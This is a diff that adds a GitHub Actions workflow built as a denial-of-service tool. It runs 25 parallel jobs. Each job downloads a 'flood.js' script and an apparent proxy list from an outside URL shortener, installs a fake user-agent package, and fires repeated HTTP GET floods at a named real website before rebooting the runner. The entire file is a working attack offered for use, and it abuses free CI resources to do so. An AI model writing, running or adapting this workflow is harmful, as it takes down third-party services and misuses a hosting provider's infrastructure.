@@ -1,0 +1,36 @@
+name: Ubuntu VDS 50 saniye flod
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+
+    steps:
+      - name: OK !
+        run: |
+          wget https://curl.by/JrQJv/flood.js
+          wget https://curl.by/xX7o1/fres.txt
+          npm install fake-useragent colors
+          chmod +x flood.js
+          PIDS=()
+          for i in {1..100}; do
+            timeout 85 node flood.js GET https://oyunortagim.com/ fres.txt 83 90 12
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: sleep 85
+        
+      - name: OK !
+        run: sudo reboot
